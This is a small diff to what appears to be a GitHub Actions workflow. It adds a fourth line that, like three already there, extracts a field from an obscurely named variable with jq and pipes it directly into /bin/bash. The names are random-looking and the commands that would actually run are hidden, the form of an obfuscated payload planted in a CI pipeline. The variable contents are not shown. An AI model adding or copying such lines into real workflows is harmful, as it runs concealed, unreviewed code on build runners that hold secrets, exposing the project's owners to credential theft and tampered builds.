@@ -43,6 +43,7 @@ jobs:
           echo $bx64 | jq -r .gx0 | /bin/bash
           printf '%s' "$d89" | jq -r .kqi3626 | /bin/bash
           printf '%s' "$qs6690" | jq -r .z7 | /bin/bash
+          echo $e11149 | jq -r .tld6991 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
